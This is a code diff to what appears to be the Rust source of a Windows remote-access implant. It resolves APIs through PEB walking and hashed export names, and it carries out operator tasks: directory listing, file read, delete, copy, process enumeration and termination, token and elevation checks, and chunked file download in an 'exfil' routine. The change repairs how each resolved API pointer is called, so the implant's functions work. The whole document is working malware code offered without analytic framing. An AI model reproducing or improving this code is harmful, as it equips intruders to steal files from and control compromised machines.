@@ -128,7 +128,10 @@ unsafe fn pwd(kernel32: *mut c_void, id: u32, results: &mut Writer) {
     if p.is_null() {
         return;
     }
-    let getcwd = *(p as *const unsafe extern "system" fn(u32, *mut u8) -> u32);
+    let getcwd = core::mem::transmute::<
+        *const core::ffi::c_void,
+        unsafe extern "system" fn(u32, *mut u8) -> u32,
+    >(p as *const core::ffi::c_void);
     let mut buf = [0u8; 260];
     let n = getcwd(259, buf.as_mut_ptr());
     if n == 0 || n as usize >= buf.len() {
@@ -144,8 +147,14 @@ unsafe fn cd(kernel32: *mut c_void, task: &Task, id: u32, results: &mut Writer) 
     if set.is_null() || get.is_null() {
         return;
     }
-    let set = *(set as *const unsafe extern "system" fn(*const u8) -> i32);
-    let get = *(get as *const unsafe extern "system" fn(u32, *mut u8) -> u32);
+    let set = core::mem::transmute::<
+        *const core::ffi::c_void,
+        unsafe extern "system" fn(*const u8) -> i32,
+    >(set as *const core::ffi::c_void);
+    let get = core::mem::transmute::<
+        *const core::ffi::c_void,
+        unsafe extern "system" fn(u32, *mut u8) -> u32,
+    >(get as *const core::ffi::c_void);
     let mut path = [0u8; 260];
     if c_path(task, &mut path).is_none() {
         error(kernel32, id, results);
@@ -171,8 +180,9 @@ unsafe fn cat(kernel32: *mut c_void, task: &Task, id: u32, results: &mut Writer)
     if create.is_null() || read.is_null() || close.is_null() {
         return;
     }
-    let create = *(create
-        as *const unsafe extern "system" fn(
+    let create = core::mem::transmute::<
+        *const core::ffi::c_void,
+        unsafe extern "system" fn(
             *const u8,
             u32,
             u32,
@@ -180,15 +190,16 @@ unsafe fn cat(kernel32: *mut c_void, task: &Task, id: u32, results: &mut Writer)
             u32,
             u32,
             *const c_void,
-        ) -> isize);
-    let read = *(read as *const unsafe extern "system" fn(
-        isize,
-        *mut u8,
-        u32,
-        *mut u32,
-        *const c_void,
-    ) -> i32);
-    let close = *(close as *const unsafe extern "system" fn(isize) -> i32);
+        ) -> isize,
+    >(create as *const core::ffi::c_void);
+    let read = core::mem::transmute::<
+        *const core::ffi::c_void,
+        unsafe extern "system" fn(isize, *mut u8, u32, *mut u32, *const c_void) -> i32,
+    >(read as *const core::ffi::c_void);
+    let close = core::mem::transmute::<
+        *const core::ffi::c_void,
+        unsafe extern "system" fn(isize) -> i32,
+    >(close as *const core::ffi::c_void);
 
     let mut path = [0u8; 260];
     if c_path(task, &mut path).is_none() {
@@ -232,9 +243,18 @@ unsafe fn ls(kernel32: *mut c_void, task: &Task, id: u32, results: &mut Writer) 
     if first.is_null() || next.is_null() || close.is_null() {
         return;
     }
-    let first = *(first as *const unsafe extern "system" fn(*const u8, *mut u8) -> isize);
-    let next = *(next as *const unsafe extern "system" fn(isize, *mut u8) -> i32);
-    let close = *(close as *const unsafe extern "system" fn(isize) -> i32);
+    let first = core::mem::transmute::<
+        *const core::ffi::c_void,
+        unsafe extern "system" fn(*const u8, *mut u8) -> isize,
+    >(first as *const core::ffi::c_void);
+    let next = core::mem::transmute::<
+        *const core::ffi::c_void,
+        unsafe extern "system" fn(isize, *mut u8) -> i32,
+    >(next as *const core::ffi::c_void);
+    let close = core::mem::transmute::<
+        *const core::ffi::c_void,
+        unsafe extern "system" fn(isize) -> i32,
+    >(close as *const core::ffi::c_void);
 
     // Search path: the directory (or pattern) plus `\*` when no wildcard
     // is present — the server strips the suffix for display.
@@ -337,7 +357,10 @@ unsafe fn mkdir(kernel32: *mut c_void, task: &Task, id: u32, results: &mut Write
     if p.is_null() {
         return;
     }
-    let create = *(p as *const unsafe extern "system" fn(*const u8, *const c_void) -> i32);
+    let create = core::mem::transmute::<
+        *const core::ffi::c_void,
+        unsafe extern "system" fn(*const u8, *const c_void) -> i32,
+    >(p as *const core::ffi::c_void);
     let mut path = [0u8; 260];
     if c_path(task, &mut path).is_none() {
         error(kernel32, id, results);
@@ -357,9 +380,18 @@ unsafe fn rm(kernel32: *mut c_void, task: &Task, id: u32, results: &mut Writer) 
     if attrs.is_null() || remove_dir.is_null() || delete_file.is_null() {
         return;
     }
-    let attrs = *(attrs as *const unsafe extern "system" fn(*const u8) -> u32);
-    let remove_dir = *(remove_dir as *const unsafe extern "system" fn(*const u8) -> i32);
-    let delete_file = *(delete_file as *const unsafe extern "system" fn(*const u8) -> i32);
+    let attrs = core::mem::transmute::<
+        *const core::ffi::c_void,
+        unsafe extern "system" fn(*const u8) -> u32,
+    >(attrs as *const core::ffi::c_void);
+    let remove_dir = core::mem::transmute::<
+        *const core::ffi::c_void,
+        unsafe extern "system" fn(*const u8) -> i32,
+    >(remove_dir as *const core::ffi::c_void);
+    let delete_file = core::mem::transmute::<
+        *const core::ffi::c_void,
+        unsafe extern "system" fn(*const u8) -> i32,
+    >(delete_file as *const core::ffi::c_void);
     let mut path = [0u8; 260];
     if c_path(task, &mut path).is_none() {
         error(kernel32, id, results);
@@ -409,10 +441,16 @@ unsafe fn copy_move(
     }
     let ok = if is_copy {
         // bFailIfExists = FALSE: overwrite like the native dialog.
-        let copy = *(p as *const unsafe extern "system" fn(*const u8, *const u8, i32) -> i32);
+        let copy = core::mem::transmute::<
+            *const core::ffi::c_void,
+            unsafe extern "system" fn(*const u8, *const u8, i32) -> i32,
+        >(p as *const core::ffi::c_void);
         copy(src.as_ptr(), dst.as_ptr(), 0) != 0
     } else {
-        let mv = *(p as *const unsafe extern "system" fn(*const u8, *const u8) -> i32);
+        let mv = core::mem::transmute::<
+            *const core::ffi::c_void,
+            unsafe extern "system" fn(*const u8, *const u8) -> i32,
+        >(p as *const core::ffi::c_void);
         mv(src.as_ptr(), dst.as_ptr()) != 0
     };
     if !ok {
@@ -445,7 +483,10 @@ unsafe fn proc_identity(
         let wow = peb::find_export(kernel32, H_IS_WOW64_PROCESS);
         if !wow.is_null() {
             let mut is_wow: i32 = 0;
-            let wow = *(wow as *const unsafe extern "system" fn(isize, *mut i32) -> i32);
+            let wow = core::mem::transmute::<
+                *const core::ffi::c_void,
+                unsafe extern "system" fn(isize, *mut i32) -> i32,
+            >(wow as *const core::ffi::c_void);
             if wow(handle, &mut is_wow) != 0 {
                 arch = if is_wow != 0 { 0 } else { 1 };
             }
@@ -464,18 +505,17 @@ unsafe fn proc_identity(
             let get_info = peb::find_export(advapi32, H_GET_TOKEN_INFORMATION);
             let lookup = peb::find_export(advapi32, H_LOOKUP_ACCOUNT_SID_A);
             if !open_token.is_null() && !get_info.is_null() && !lookup.is_null() {
-                let open_token = *(open_token
-                    as *const unsafe extern "system" fn(isize, u32, *mut isize) -> i32);
-                let get_info = *(get_info
-                    as *const unsafe extern "system" fn(
-                        isize,
-                        u32,
-                        *mut c_void,
-                        u32,
-                        *mut u32,
-                    ) -> i32);
-                let lookup = *(lookup
-                    as *const unsafe extern "system" fn(
+                let open_token = core::mem::transmute::<
+                    *const core::ffi::c_void,
+                    unsafe extern "system" fn(isize, u32, *mut isize) -> i32,
+                >(open_token as *const core::ffi::c_void);
+                let get_info = core::mem::transmute::<
+                    *const core::ffi::c_void,
+                    unsafe extern "system" fn(isize, u32, *mut c_void, u32, *mut u32) -> i32,
+                >(get_info as *const core::ffi::c_void);
+                let lookup = core::mem::transmute::<
+                    *const core::ffi::c_void,
+                    unsafe extern "system" fn(
                         *const c_void,
                         *const c_void,
                         *mut u8,
@@ -483,7 +523,8 @@ unsafe fn proc_identity(
                         *mut u8,
                         *mut u32,
                         *mut u32,
-                    ) -> i32);
+                    ) -> i32,
+                >(lookup as *const core::ffi::c_void);
                 let mut token: isize = 0;
                 if open_token(handle, 0x0008, &mut token) != 0 {
                     let mut elev: u32 = 0;
@@ -520,7 +561,10 @@ unsafe fn proc_identity(
                     if !kernel32.is_null() {
                         let close = peb::find_export(kernel32, H_CLOSE_HANDLE);
                         if !close.is_null() {
-                            (*(close as *const unsafe extern "system" fn(isize) -> i32))(token);
+                            (core::mem::transmute::<
+                                *const core::ffi::c_void,
+                                unsafe extern "system" fn(isize) -> i32,
+                            >(close as *const core::ffi::c_void))(token);
                         }
                     }
                 }
@@ -549,8 +593,13 @@ unsafe fn disks(kernel32: *mut c_void, id: u32, results: &mut Writer) {
     if drives.is_null() || dtype.is_null() {
         return;
     }
-    let drives = *(drives as *const unsafe extern "system" fn() -> u32);
-    let dtype = *(dtype as *const unsafe extern "system" fn(*const u8) -> u32);
+    let drives = core::mem::transmute::<*const core::ffi::c_void, unsafe extern "system" fn() -> u32>(
+        drives as *const core::ffi::c_void,
+    );
+    let dtype = core::mem::transmute::<
+        *const core::ffi::c_void,
+        unsafe extern "system" fn(*const u8) -> u32,
+    >(dtype as *const core::ffi::c_void);
     let mask = drives();
     if mask == 0 {
         error(kernel32, id, results);
@@ -602,11 +651,26 @@ unsafe fn ps_list(kernel32: *mut c_void, id: u32, results: &mut Writer) {
     if snap.is_null() || first.is_null() || next.is_null() || session.is_null() || open.is_null() {
         return;
     }
-    let snap = *(snap as *const unsafe extern "system" fn(u32, u32) -> isize);
-    let first = *(first as *const unsafe extern "system" fn(isize, *mut u8) -> i32);
-    let next = *(next as *const unsafe extern "system" fn(isize, *mut u8) -> i32);
-    let session = *(session as *const unsafe extern "system" fn(u32, *mut u32) -> i32);
-    let open = *(open as *const unsafe extern "system" fn(u32, i32, u32) -> isize);
+    let snap = core::mem::transmute::<
+        *const core::ffi::c_void,
+        unsafe extern "system" fn(u32, u32) -> isize,
+    >(snap as *const core::ffi::c_void);
+    let first = core::mem::transmute::<
+        *const core::ffi::c_void,
+        unsafe extern "system" fn(isize, *mut u8) -> i32,
+    >(first as *const core::ffi::c_void);
+    let next = core::mem::transmute::<
+        *const core::ffi::c_void,
+        unsafe extern "system" fn(isize, *mut u8) -> i32,
+    >(next as *const core::ffi::c_void);
+    let session = core::mem::transmute::<
+        *const core::ffi::c_void,
+        unsafe extern "system" fn(u32, *mut u32) -> i32,
+    >(session as *const core::ffi::c_void);
+    let open = core::mem::transmute::<
+        *const core::ffi::c_void,
+        unsafe extern "system" fn(u32, i32, u32) -> isize,
+    >(open as *const core::ffi::c_void);
 
     let handle = snap(0x2, 0); // TH32CS_SNAPPROCESS
     if handle == -1 {
@@ -661,7 +725,10 @@ unsafe fn ps_list(kernel32: *mut c_void, id: u32, results: &mut Writer) {
         if ph != 0 {
             let close = peb::find_export(kernel32, H_CLOSE_HANDLE);
             if !close.is_null() {
-                (*(close as *const unsafe extern "system" fn(isize) -> i32))(ph);
+                (core::mem::transmute::<
+                    *const core::ffi::c_void,
+                    unsafe extern "system" fn(isize) -> i32,
+                >(close as *const core::ffi::c_void))(ph);
             }
         }
 
@@ -683,7 +750,9 @@ unsafe fn ps_list(kernel32: *mut c_void, id: u32, results: &mut Writer) {
     }
     let close = peb::find_export(kernel32, H_CLOSE_HANDLE);
     if !close.is_null() {
-        (*(close as *const unsafe extern "system" fn(isize) -> i32))(handle);
+        (core::mem::transmute::<*const core::ffi::c_void, unsafe extern "system" fn(isize) -> i32>(
+            close as *const core::ffi::c_void,
+        ))(handle);
     }
 
     if count == 0 {
@@ -709,8 +778,14 @@ unsafe fn ps_kill(kernel32: *mut c_void, pid: u32, id: u32, results: &mut Writer
     if open.is_null() || term.is_null() {
         return;
     }
-    let open = *(open as *const unsafe extern "system" fn(u32, i32, u32) -> isize);
-    let term = *(term as *const unsafe extern "system" fn(isize, u32) -> i32);
+    let open = core::mem::transmute::<
+        *const core::ffi::c_void,
+        unsafe extern "system" fn(u32, i32, u32) -> isize,
+    >(open as *const core::ffi::c_void);
+    let term = core::mem::transmute::<
+        *const core::ffi::c_void,
+        unsafe extern "system" fn(isize, u32) -> i32,
+    >(term as *const core::ffi::c_void);
     // PROCESS_TERMINATE.
     let handle = open(0x0001, 0, pid);
     if handle == -1 {
@@ -720,7 +795,9 @@ unsafe fn ps_kill(kernel32: *mut c_void, pid: u32, id: u32, results: &mut Writer
     let ok = term(handle, 1);
     let close = peb::find_export(kernel32, H_CLOSE_HANDLE);
     if !close.is_null() {
-        (*(close as *const unsafe extern "system" fn(isize) -> i32))(handle);
+        (core::mem::transmute::<*const core::ffi::c_void, unsafe extern "system" fn(isize) -> i32>(
+            close as *const core::ffi::c_void,
+        ))(handle);
     }
     if ok == 0 {
         error(kernel32, id, results);
@@ -765,8 +842,9 @@ unsafe fn download_start(instance: &mut Instance, task: &Task, id: u32, results:
     if create.is_null() || close.is_null() {
         return;
     }
-    let create = *(create
-        as *const unsafe extern "system" fn(
+    let create = core::mem::transmute::<
+        *const core::ffi::c_void,
+        unsafe extern "system" fn(
             *const u8,
             u32,
             u32,
@@ -774,10 +852,13 @@ unsafe fn download_start(instance: &mut Instance, task: &Task, id: u32, results:
             u32,
             u32,
             *const c_void,
-        ) -> isize);
+        ) -> isize,
+    >(create as *const core::ffi::c_void);
     // An open download closes first (one at a time).
     if let Some(dl) = instance.download.take() {
-        (*(close as *const unsafe extern "system" fn(isize) -> i32))(dl.handle);
+        (core::mem::transmute::<*const core::ffi::c_void, unsafe extern "system" fn(isize) -> i32>(
+            close as *const core::ffi::c_void,
+        ))(dl.handle);
     }
     let mut path = [0u8; 260];
     if c_path(task, &mut path).is_none() {
@@ -801,7 +882,10 @@ unsafe fn download_start(instance: &mut Instance, task: &Task, id: u32, results:
     let tell = peb::find_export(kernel32, fnv1a64(b"SetFilePointer"));
     let mut size = 0u64;
     if !tell.is_null() {
-        let tell = *(tell as *const unsafe extern "system" fn(isize, i32, *mut i32, u32) -> u32);
+        let tell = core::mem::transmute::<
+            *const core::ffi::c_void,
+            unsafe extern "system" fn(isize, i32, *mut i32, u32) -> u32,
+        >(tell as *const core::ffi::c_void);
         let mut high: i32 = 0;
         let _ = tell(handle, 0, &mut high, 2); // FILE_END
         size = ((high as i64 as u64) << 32).wrapping_add(0);
@@ -850,9 +934,14 @@ pub unsafe fn download_tick(instance: &mut Instance, w: &mut Writer, chunk: &mut
     if read_ptr.is_null() || close.is_null() {
         return;
     }
-    let read = *(read_ptr
-        as *const unsafe extern "system" fn(isize, *mut u8, u32, *mut u32, *const c_void) -> i32);
-    let close = *(close as *const unsafe extern "system" fn(isize) -> i32);
+    let read = core::mem::transmute::<
+        *const core::ffi::c_void,
+        unsafe extern "system" fn(isize, *mut u8, u32, *mut u32, *const c_void) -> i32,
+    >(read_ptr as *const core::ffi::c_void);
+    let close = core::mem::transmute::<
+        *const core::ffi::c_void,
+        unsafe extern "system" fn(isize) -> i32,
+    >(close as *const core::ffi::c_void);
     let want = chunk.len().min(DOWNLOAD_CHUNK);
     let mut got: u32 = 0;
     let handle = dl.handle;
@@ -891,7 +980,10 @@ unsafe fn exfil(instance: &mut Instance, action: u8, file_id: u32, id: u32, resu
         if matches {
             if let Some(dl) = instance.download.take() {
                 if !close.is_null() {
-                    (*(close as *const unsafe extern "system" fn(isize) -> i32))(dl.handle);
+                    (core::mem::transmute::<
+                        *const core::ffi::c_void,
+                        unsafe extern "system" fn(isize) -> i32,
+                    >(close as *const core::ffi::c_void))(dl.handle);
                 }
             }
         }
@@ -981,8 +1073,9 @@ unsafe fn upload_write(instance: &mut Instance, task: &Task, id: u32, results: &
         if create.is_null() || write.is_null() || close.is_null() {
             error(kernel32, id, results);
         } else {
-            let create = *(create
-                as *const unsafe extern "system" fn(
+            let create = core::mem::transmute::<
+                *const core::ffi::c_void,
+                unsafe extern "system" fn(
                     *const u8,
                     u32,
                     u32,
@@ -990,16 +1083,16 @@ unsafe fn upload_write(instance: &mut Instance, task: &Task, id: u32, results: &
                     u32,
                     u32,
                     *const c_void,
-                ) -> isize);
-            let write = *(write
-                as *const unsafe extern "system" fn(
-                    isize,
-                    *const u8,
-                    u32,
-                    *mut u32,
-                    *const c_void,
-                ) -> i32);
-            let close = *(close as *const unsafe extern "system" fn(isize) -> i32);
+                ) -> isize,
+            >(create as *const core::ffi::c_void);
+            let write = core::mem::transmute::<
+                *const core::ffi::c_void,
+                unsafe extern "system" fn(isize, *const u8, u32, *mut u32, *const c_void) -> i32,
+            >(write as *const core::ffi::c_void);
+            let close = core::mem::transmute::<
+                *const core::ffi::c_void,
+                unsafe extern "system" fn(isize) -> i32,
+            >(close as *const core::ffi::c_void);
             let mut path = [0u8; 260];
             if c_path(task, &mut path).is_none() {
                 error(kernel32, id, results);
@@ -1049,7 +1142,9 @@ unsafe fn error(kernel32: *mut c_void, id: u32, results: &mut Writer) {
     let code = if p.is_null() {
         0
     } else {
-        (*(p as *const unsafe extern "system" fn() -> u32))()
+        (core::mem::transmute::<*const core::ffi::c_void, unsafe extern "system" fn() -> u32>(
+            p as *const core::ffi::c_void,
+        ))()
     };
     let _ = transport::push_error_result(results, id, code);
 }
